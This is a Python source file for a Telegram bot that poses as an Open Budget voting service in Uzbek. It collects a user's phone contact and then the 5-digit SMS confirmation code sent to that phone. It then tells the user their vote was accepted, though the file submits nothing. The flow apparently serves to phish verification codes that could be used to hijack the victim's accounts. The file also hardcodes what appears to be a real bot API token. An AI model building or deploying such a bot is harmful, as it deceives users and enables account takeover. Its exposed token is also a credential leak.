from aiogram import executor, Bot, Dispatcher, types
import logging,time
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import state
from aiogram.dispatcher import FSMContext
from Keyboards.default import menu_buttons
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from states import OpenBudjetStates

API_TOKEN = "7021844675:AAF4Yc8jvT8Hunb38JKvjlkYCg1b_dwP1Sg"
bot = Bot(token=API_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot, storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

@dp.message_handler(commands='start')
async def main(message : types.Message):
    await message.answer("""
🆔 048336762001
👤 Zoir Mirzobayev
ℹ️ 

⚠️ "✅ Ovoz berish" tugmasini bosganizdan so'ng sizning ovozingiz qabul qilinadi! (Bir mavsumda bitta tashabusga ovoz bera olishingizni eslatamiz! Sizning ovozingiz uchun hech qanday mukofot berilmaydi!)

""",reply_markup=menu_buttons)
    await OpenBudjetStates.contact.set()
    

@dp.message_handler(content_types=types.ContentType.CONTACT,state=OpenBudjetStates.contact)
async def contactsend(message:types.Message,state:FSMContext):
    await message.answer("""
Iltimos telefon raqamingizga yuborilgan
tasdiqlash kodini kiriting
                         """)
    await state.finish()
    await OpenBudjetStates.sms_code.set()

@dp.message_handler(state=OpenBudjetStates.sms_code)
async def smscode(message: types.Message, state: FSMContext):
    if message.text.isnumeric():
        if len(message.text) == 5:
            await message.answer("Sizning ovozingiz qayta ishlanmoqda.\nIltimos birozdan so'ng tekshirib ko'ring!")
            time.sleep(1)
            await message.reply("Tabriilaymiz sizning ovozingiz qabul qilindi.")
            await state.finish()
        else:
            await message.answer("5 ta son kiriting !")
    else:
        await message.answer("Faqat son kiriting")



if __name__ == "__main__":
    executor.start_polling(dp,skip_updates=True)